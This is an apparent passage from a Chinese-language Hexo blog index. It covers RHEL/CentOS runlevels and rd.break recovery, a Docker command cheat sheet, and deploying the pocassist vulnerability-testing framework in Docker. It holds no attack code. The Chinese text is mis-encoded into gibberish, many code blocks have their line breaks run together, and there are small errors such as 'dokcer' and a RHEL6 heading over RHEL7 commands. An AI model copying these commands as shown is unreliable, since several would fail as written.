README-rwxr-xr-x. 1 root root  2437 Jun 26  2015 rhnsd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>åœ¨/etc/rc.d ä¸‹æœ‰ 7 ä¸ªåä¸º rcN.d çš„ç›®å½•ï¼Œå¯¹åº”ç³»ç»Ÿçš„ 7 ä¸ªè¿è¡Œçº§åˆ«å³(0-6)ã€‚</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /etc/rc.dtotal 4drwxr-xr-x. 2 root root  83 Jul 19 23:16 init.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc0.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc1.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc2.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc3.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc4.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc5.ddrwxr-xr-x. 2 root root  61 Jul 19 23:16 rc6.d-rw-r--r--. 1 root root 473 Sep 13  2016 rc.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€RHEL6-æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«"><a href="#å››ã€RHEL6-æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«" class="headerlink" title="å››ã€RHEL6 æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«"></a>å››ã€RHEL6 æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«</h2><ol><li> æŸ¥çœ‹å¯åŠ¨çº§åˆ«é…ç½®æ–‡ä»¶</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat /etc/inittab</span><span class="token comment" spellcheck="true"># inittab is only used by upstart for the default runlevel.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># System initialization is started by /etc/init/rcS.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Individual runlevels are started by /etc/init/rc.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf,</span><span class="token comment" spellcheck="true"># with configuration in /etc/sysconfig/init.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># For information on how to write upstart event handlers, or how</span><span class="token comment" spellcheck="true"># upstart works, see init(5), init(8), and initctl(8).</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Default runlevel. The runlevels used are:</span><span class="token comment" spellcheck="true">#   0 - halt (Do NOT set initdefault to this)</span><span class="token comment" spellcheck="true">#   1 - Single user mode</span><span class="token comment" spellcheck="true">#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)</span><span class="token comment" spellcheck="true">#   3 - Full multiuser mode</span><span class="token comment" spellcheck="true">#   4 - unused</span><span class="token comment" spellcheck="true">#   5 - X11</span><span class="token comment" spellcheck="true">#   6 - reboot (Do NOT set initdefault to this)</span><span class="token comment" spellcheck="true">#</span>id:3:initdefault:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åªéœ€è¦æ›´æ”¹æœ€åä¸€è¡Œå¯¹åº”çš„æ•°å­—å³å¯æ”¹å˜ç³»ç»Ÿçš„é»˜è®¤å¯åŠ¨çº§åˆ«</p></blockquote><p>â€‹</p><h2 id="äº”ã€RHEL6-æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«"><a href="#äº”ã€RHEL6-æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«" class="headerlink" title="äº”ã€RHEL6 æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«"></a>äº”ã€RHEL6 æ›´æ”¹é»˜è®¤å¯åŠ¨çº§åˆ«</h2><ol><li>æŸ¥çœ‹é»˜è®¤å¯åŠ¨çº§åˆ«</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ systemctl get-defaultmulti-user.target<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>è®¾ç½®é»˜è®¤å¯åŠ¨çº§åˆ«</li></ol><p>è®¾ç½®é»˜è®¤å¯åŠ¨ä¸ºå¤šç”¨æˆ·å­—ç¬¦ç•Œé¢ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl set-default multi-user.target</span>Removed symlink /etc/systemd/system/default.target.Created symlink from /etc/systemd/system/default.target to /usr/lib/systemd/system/multi-user.target.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è®¾ç½®é»˜è®¤å¯åŠ¨ä¸ºå¤šç”¨æˆ·å›¾å½¢ç•Œé¢ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl set-default graphical.target</span>Removed symlink /etc/systemd/system/default.target.Created symlink from /etc/systemd/system/default.target to /usr/lib/systemd/system/graphical.target.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„ï¼šæœ€å°åŒ–å®‰è£…çš„æ“ä½œç³»ç»Ÿé»˜è®¤æ˜¯æ²¡æœ‰å›¾å½¢åŒ–è½¯ä»¶çš„<br>å®‰è£…å›¾å½¢åŒ–è½¯ä»¶æ–¹æ³•å¦‚ä¸‹<br>yum install -y xorg* gnome* glx*</p></blockquote><h2 id="å…­ã€RHEL7ã€CentOS7-å¯åŠ¨çº§åˆ«ä¿®å¤"><a href="#å…­ã€RHEL7ã€CentOS7-å¯åŠ¨çº§åˆ«ä¿®å¤" class="headerlink" title="å…­ã€RHEL7ã€CentOS7 å¯åŠ¨çº§åˆ«ä¿®å¤"></a>å…­ã€RHEL7ã€CentOS7 å¯åŠ¨çº§åˆ«ä¿®å¤</h2><ol><li>å¼€æœº</li><li>æŒ‰ä»»æ„é”®ï¼Œè®©ç³»ç»Ÿåœç•™åœ¨å¦‚ä¸‹ç•Œé¢</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626781419388-81487de1-32c8-4214-8837-3603610f0b8e.png#clientId=u0b1258d6-5811-4&amp;from=paste&amp;height=448&amp;id=uc1c1a6c8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=448&amp;originWidth=730&amp;originalType=binary%E2%88%B6=1&amp;size=22447&amp;status=done&amp;style=none&amp;taskId=u43024983-ef52-480d-974d-11cbdff17d2&amp;width=730" alt="image.png"></p><ol start="3"><li>æŒ‰ e é”®è¿›å…¥ç¼–è¾‘</li><li>åœ¨å¦‚ä¸‹ä½ç½®æ·»åŠ  rd.break</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626782323630-c3e3aac5-3092-4ebc-9c5d-81550cfebec7.png#clientId=u0b1258d6-5811-4&amp;from=paste&amp;height=520&amp;id=uda69f977&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=520&amp;originWidth=860&amp;originalType=binary%E2%88%B6=1&amp;size=90802&amp;status=done&amp;style=none&amp;taskId=u6971a49f-3a02-486e-a04d-a56815d2874&amp;width=860" alt="image.png"></p><ol start="5"><li>æŒ‰ Ctrl+x é”®è¿›å…¥ switch_root</li><li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</li></ol><ul><li>mount -o remount,rw /sysroot</li><li>chroot /sysroot</li><li>systemctl set-default multi-user.target</li><li>exit</li><li>mount -o remount,ro /sysroot</li><li>exit</li></ul><ol start="7"><li>ä¿®æ”¹å®Œæˆ</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOSç³»ç»Ÿå„ç›®å½•å«ä¹‰</title>
      <link href="/post/c6489f1d.html"/>
      <url>/post/c6489f1d.html</url>
      
        <content type="html"><![CDATA[<h2 id="CentOS-ç³»ç»Ÿå„ç›®å½•å«ä¹‰"><a href="#CentOS-ç³»ç»Ÿå„ç›®å½•å«ä¹‰" class="headerlink" title="CentOS ç³»ç»Ÿå„ç›®å½•å«ä¹‰"></a>CentOS ç³»ç»Ÿå„ç›®å½•å«ä¹‰</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1626952340496-49c9a5eb-8389-49d8-886b-783247728a5d.png#clientId=u7275b21b-955f-4&amp;from=paste&amp;height=1131&amp;id=u094853ee&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1131&amp;originWidth=1504&amp;originalType=binary%E2%88%B6=1&amp;size=233091&amp;status=done&amp;style=none&amp;taskId=ud83f0231-3111-47e3-ade0-54ef381a1b4&amp;width=1504" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerå¸¸ç”¨å‘½ä»¤</title>
      <link href="/post/29dc6fe8.html"/>
      <url>/post/29dc6fe8.html</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-å¸¸ç”¨å‘½ä»¤"><a href="#Docker-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Docker å¸¸ç”¨å‘½ä»¤"></a>Docker å¸¸ç”¨å‘½ä»¤</h1><h2 id="ä¸€ã€é•œåƒæ“ä½œ"><a href="#ä¸€ã€é•œåƒæ“ä½œ" class="headerlink" title="ä¸€ã€é•œåƒæ“ä½œ"></a>ä¸€ã€é•œåƒæ“ä½œ</h2><h3 id="è·å–é•œåƒ"><a href="#è·å–é•œåƒ" class="headerlink" title="è·å–é•œåƒ"></a>è·å–é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker pull <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åˆ—å‡ºé•œåƒ"><a href="#åˆ—å‡ºé•œåƒ" class="headerlink" title="åˆ—å‡ºé•œåƒ"></a>åˆ—å‡ºé•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åˆ é™¤é•œåƒ"><a href="#åˆ é™¤é•œåƒ" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker image <span class="token function">rm</span> <span class="token operator">&lt;</span>é•œåƒ<span class="token operator">></span><span class="token comment" spellcheck="true"># åˆ é™¤åä¸º redis çš„é•œåƒ</span>docker image <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker image <span class="token function">ls</span> -q redis<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å½“å‰ç›®å½•çš„-Dockerfile-åˆ›å»ºé•œåƒ"><a href="#å½“å‰ç›®å½•çš„-Dockerfile-åˆ›å»ºé•œåƒ" class="headerlink" title="å½“å‰ç›®å½•çš„ Dockerfile åˆ›å»ºé•œåƒ"></a>å½“å‰ç›®å½•çš„ Dockerfile åˆ›å»ºé•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker build -t <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŒ‡å®šæ–‡ä»¶æ„å»ºé•œåƒ"><a href="#æŒ‡å®šæ–‡ä»¶æ„å»ºé•œåƒ" class="headerlink" title="æŒ‡å®šæ–‡ä»¶æ„å»ºé•œåƒ"></a>æŒ‡å®šæ–‡ä»¶æ„å»ºé•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker build -f /path/to/a/Dockerfile -t <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å°†é•œåƒä¿å­˜-tar-åŒ…"><a href="#å°†é•œåƒä¿å­˜-tar-åŒ…" class="headerlink" title="å°†é•œåƒä¿å­˜ tar åŒ…"></a>å°†é•œåƒä¿å­˜ tar åŒ…</h3><pre class="line-numbers language-bash"><code class="language-bash">docker save -o image-name.tar <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¯¼å…¥-tar-é•œåƒ"><a href="#å¯¼å…¥-tar-é•œåƒ" class="headerlink" title="å¯¼å…¥ tar é•œåƒ"></a>å¯¼å…¥ tar é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker load --input image-name.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å°†é•œåƒä¿®æ”¹æˆè§„èŒƒçš„é•œåƒ"><a href="#å°†é•œåƒä¿®æ”¹æˆè§„èŒƒçš„é•œåƒ" class="headerlink" title="å°†é•œåƒä¿®æ”¹æˆè§„èŒƒçš„é•œåƒ"></a>å°†é•œåƒä¿®æ”¹æˆè§„èŒƒçš„é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker tag <span class="token operator">&lt;</span>existing-image<span class="token operator">></span> <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äºŒã€å®¹å™¨æ“ä½œ"><a href="#äºŒã€å®¹å™¨æ“ä½œ" class="headerlink" title="äºŒã€å®¹å™¨æ“ä½œ"></a>äºŒã€å®¹å™¨æ“ä½œ</h2><h3 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -d -p ç‰©ç†ç«¯å£1:å®¹å™¨ç«¯å£1 -p ç‰©ç†ç«¯å£2:ç‰©ç†ç«¯å£2 --name å®¹å™¨å <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŸ¥çœ‹å®¹å™¨"><a href="#æŸ¥çœ‹å®¹å™¨" class="headerlink" title="æŸ¥çœ‹å®¹å™¨"></a>æŸ¥çœ‹å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span>docker <span class="token function">ps</span> -adocker <span class="token function">ps</span> -a --no-trunc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="è¿›å…¥å®¹å™¨"><a href="#è¿›å…¥å®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it å®¹å™¨å/ID <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker start <span class="token operator">&lt;</span>å®¹å™¨<span class="token operator">></span><span class="token comment" spellcheck="true"># é‡å¯</span>docker restart <span class="token operator">&lt;</span>å®¹å™¨<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker stop <span class="token operator">&lt;</span>å®¹å™¨<span class="token operator">></span>docker stop <span class="token variable"><span class="token variable">$(</span>dokcer <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å®¹å™¨æ‰“åŒ…é•œåƒ"><a href="#å®¹å™¨æ‰“åŒ…é•œåƒ" class="headerlink" title="å®¹å™¨æ‰“åŒ…é•œåƒ"></a>å®¹å™¨æ‰“åŒ…é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker commit -a <span class="token string">"ä½œè€…"</span> -m <span class="token string">"å¤‡æ³¨"</span> å®¹å™¨ID <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å°†å®¹å™¨æ‰“åŒ…æˆè§„èŒƒçš„é•œåƒ"><a href="#å°†å®¹å™¨æ‰“åŒ…æˆè§„èŒƒçš„é•œåƒ" class="headerlink" title="å°†å®¹å™¨æ‰“åŒ…æˆè§„èŒƒçš„é•œåƒ"></a>å°†å®¹å™¨æ‰“åŒ…æˆè§„èŒƒçš„é•œåƒ</h3><pre class="line-numbers language-bash"><code class="language-bash">docker commit <span class="token operator">&lt;</span>exiting-Container<span class="token operator">></span> <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸‰ã€æŒ‚è½½"><a href="#ä¸‰ã€æŒ‚è½½" class="headerlink" title="ä¸‰ã€æŒ‚è½½"></a>ä¸‰ã€æŒ‚è½½</h2><h3 id="ç£ç›˜æŒ‚è½½"><a href="#ç£ç›˜æŒ‚è½½" class="headerlink" title="ç£ç›˜æŒ‚è½½"></a>ç£ç›˜æŒ‚è½½</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -d -p 8080:80 -v æœ¬æœºè·¯å¾„:å®¹å™¨è·¯å¾„ --name å®¹å™¨å <span class="token operator">&lt;</span>image-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å››ã€æ–‡ä»¶æ‹·è´"><a href="#å››ã€æ–‡ä»¶æ‹·è´" class="headerlink" title="å››ã€æ–‡ä»¶æ‹·è´"></a>å››ã€æ–‡ä»¶æ‹·è´</h2><h3 id="ç‰©ç†æœºæ‹·è´æ–‡ä»¶åˆ°å®¹å™¨"><a href="#ç‰©ç†æœºæ‹·è´æ–‡ä»¶åˆ°å®¹å™¨" class="headerlink" title="ç‰©ç†æœºæ‹·è´æ–‡ä»¶åˆ°å®¹å™¨"></a>ç‰©ç†æœºæ‹·è´æ–‡ä»¶åˆ°å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">cp</span> test.txt å®¹å™¨ID:/var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å®¹å™¨æ‹·è´æ–‡ä»¶åˆ°ç‰©ç†æœº"><a href="#å®¹å™¨æ‹·è´æ–‡ä»¶åˆ°ç‰©ç†æœº" class="headerlink" title="å®¹å™¨æ‹·è´æ–‡ä»¶åˆ°ç‰©ç†æœº"></a>å®¹å™¨æ‹·è´æ–‡ä»¶åˆ°ç‰©ç†æœº</h3><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">cp</span> å®¹å™¨ID:/var/www/html/test.txt ç‰©ç†æœºè·¯å¾„<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äº”ã€docker-compose-ç›¸å…³"><a href="#äº”ã€docker-compose-ç›¸å…³" class="headerlink" title="äº”ã€docker-compose ç›¸å…³"></a>äº”ã€docker-compose ç›¸å…³</h2><h3 id="åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨"><a href="#åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨" class="headerlink" title="åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨"></a>åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å…³é—­å¹¶åˆ é™¤å®¹å™¨"><a href="#å…³é—­å¹¶åˆ é™¤å®¹å™¨" class="headerlink" title="å…³é—­å¹¶åˆ é™¤å®¹å™¨"></a>å…³é—­å¹¶åˆ é™¤å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose down<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¼€å¯-å…³é—­-é‡å¯å·²ç»å­˜åœ¨çš„ç”±-docker-compose-ç»´æŠ¤çš„å®¹å™¨"><a href="#å¼€å¯-å…³é—­-é‡å¯å·²ç»å­˜åœ¨çš„ç”±-docker-compose-ç»´æŠ¤çš„å®¹å™¨" class="headerlink" title="å¼€å¯|å…³é—­|é‡å¯å·²ç»å­˜åœ¨çš„ç”± docker-compose ç»´æŠ¤çš„å®¹å™¨"></a>å¼€å¯|å…³é—­|é‡å¯å·²ç»å­˜åœ¨çš„ç”± docker-compose ç»´æŠ¤çš„å®¹å™¨</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose start<span class="token operator">|</span>stop<span class="token operator">|</span>restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¿è¡Œå½“å‰å†…å®¹å¹¶é‡æ–°æ„å»º"><a href="#è¿è¡Œå½“å‰å†…å®¹å¹¶é‡æ–°æ„å»º" class="headerlink" title="è¿è¡Œå½“å‰å†…å®¹å¹¶é‡æ–°æ„å»º"></a>è¿è¡Œå½“å‰å†…å®¹å¹¶é‡æ–°æ„å»º</h3><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d --build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å…­ã€å…¶å®ƒ"><a href="#å…­ã€å…¶å®ƒ" class="headerlink" title="å…­ã€å…¶å®ƒ"></a>å…­ã€å…¶å®ƒ</h2><h3 id="ç™»å½•-Docker-Hub"><a href="#ç™»å½•-Docker-Hub" class="headerlink" title="ç™»å½• Docker Hub"></a>ç™»å½• Docker Hub</h3><pre class="line-numbers language-bash"><code class="language-bash">docker login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ä¸Šä¼ æ¨é€é•œåƒåˆ°å…¬å…±ä»“åº“"><a href="#ä¸Šä¼ æ¨é€é•œåƒåˆ°å…¬å…±ä»“åº“" class="headerlink" title="ä¸Šä¼ æ¨é€é•œåƒåˆ°å…¬å…±ä»“åº“"></a>ä¸Šä¼ æ¨é€é•œåƒåˆ°å…¬å…±ä»“åº“</h3><pre class="line-numbers language-bash"><code class="language-bash">docker push <span class="token operator">&lt;</span>hub-user<span class="token operator">></span>/<span class="token operator">&lt;</span>repo-name<span class="token operator">></span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŸ¥çœ‹å®¹å™¨å¯åŠ¨æ—¥å¿—-å¯åŠ¨å¤±è´¥æ’æŸ¥"><a href="#æŸ¥çœ‹å®¹å™¨å¯åŠ¨æ—¥å¿—-å¯åŠ¨å¤±è´¥æ’æŸ¥" class="headerlink" title="æŸ¥çœ‹å®¹å™¨å¯åŠ¨æ—¥å¿—-å¯åŠ¨å¤±è´¥æ’æŸ¥"></a>æŸ¥çœ‹å®¹å™¨å¯åŠ¨æ—¥å¿—-å¯åŠ¨å¤±è´¥æ’æŸ¥</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token punctuation">$(</span>docker inspect --format <span class="token string">'{{.LogPath}}'</span> å®¹å™¨ID<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> äº‘è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> äº‘è®¡ç®— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeréƒ¨ç½²pocassist</title>
      <link href="/post/4409d05f.html"/>
      <url>/post/4409d05f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-éƒ¨ç½²-pocassist"><a href="#Docker-éƒ¨ç½²-pocassist" class="headerlink" title="Docker éƒ¨ç½² pocassist"></a>Docker éƒ¨ç½² pocassist</h1><h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>ç®€ä»‹ï¼šä¸€æ¬¾å…¨æ–°çš„å¼€æºæ¼æ´æµ‹è¯•æ¡†æ¶ï¼Œå®ç° poc åœ¨çº¿ç¼–è¾‘ã€è¿è¡Œã€æ‰¹é‡æµ‹è¯•ã€‚<br>githubï¼š<a href="https://github.com/jweny/pocassist/">https://github.com/jweny/pocassist/</a><br>pocassist å®˜ç½‘ï¼š<a href="https://pocassist.jweny.top/">https://pocassist.jweny.top/</a></p><h2 id="äºŒã€éƒ¨ç½²"><a href="#äºŒã€éƒ¨ç½²" class="headerlink" title="äºŒã€éƒ¨ç½²"></a>äºŒã€éƒ¨ç½²</h2><ol><li>æ–°å»ºç›®å½•</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> pocassist <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> pocassist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ä¸‹è½½ pocassist</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/jweny/pocassist/releases/download/1.0.1/pocassist_linux_amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ä¸‹è½½ pocassistdb</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/jweny/pocassistdb/releases/download/1.0.2/pocassistdb.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ç¼–å†™ Dockerfile</li></ol><pre class="line-numbers language-bash"><code class="language-bash">FROM centos:latestRUN yum -y upgradeRUN yum -y update glibcRUN <span class="token function">mkdir</span> /pocassistADD pocassist_linux_amd64.zip /pocassistADD pocassistdb.zip /pocassistRUN yum -y <span class="token function">install</span> unzipRUN <span class="token function">cd</span> /pocassist <span class="token operator">&amp;&amp;</span> unzip pocassist_linux_amd64.zip <span class="token operator">&amp;&amp;</span> unzip pocassistdb.zipWORKDIR /pocassistCMD ./pocassist_linux_amd64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>ç¼–å†™ docker-compose.yml</li></ol><pre class="line-numbers language-bash"><code class="language-bash">version: <span class="token string">'3'</span>services:  pocassist:    build: <span class="token keyword">.</span>    ports:      - <span class="token string">"1231:1231"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>æ„å»º</li></ol><pre class="line-numbers language-bash"><code class="language-bash">docker-compose build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>å¯åŠ¨</li></ol><pre class="line-numbers language-bash"><code class="language-bash">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸‰ã€è®¿é—®"><a href="#ä¸‰ã€è®¿é—®" class="headerlink" title="ä¸‰ã€è®¿é—®"></a>ä¸‰ã€è®¿é—®</h2><p><a href="http://ip:1231/">http://IP:1231</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEBå®‰å…¨ </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBè¯»æ“ä½œäº‹åŠ¡</title>
      <link href="/post/711beb25.html"/>
      <url>/post/711beb25.html</url>
      
